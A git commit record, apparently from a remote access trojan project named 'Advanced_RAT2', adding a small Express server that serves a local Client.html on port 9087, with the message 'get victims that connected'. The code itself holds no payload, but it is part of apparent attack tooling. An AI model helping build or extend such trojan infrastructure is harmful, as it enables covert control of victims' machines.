fe1ac7af8f73eb343386ec92a79a680a6a7bfbbc
yehonatan1 <avitantan@gmail.com>
2020-12-23 21:02:27 -0800

    get victims that connected

---
+++ Client Run.js
@@ -0,0 +1,10 @@
+const express = require('express');
+const app = express();
+
+
+app.get('/', (req, res) => {
+
+    res.sendFile("C:\\Users\\avita\\WebstormProjects\\Advanced_RAT2\\Client.html");
+});
+
+app.listen(9087, '0.0.0.0')
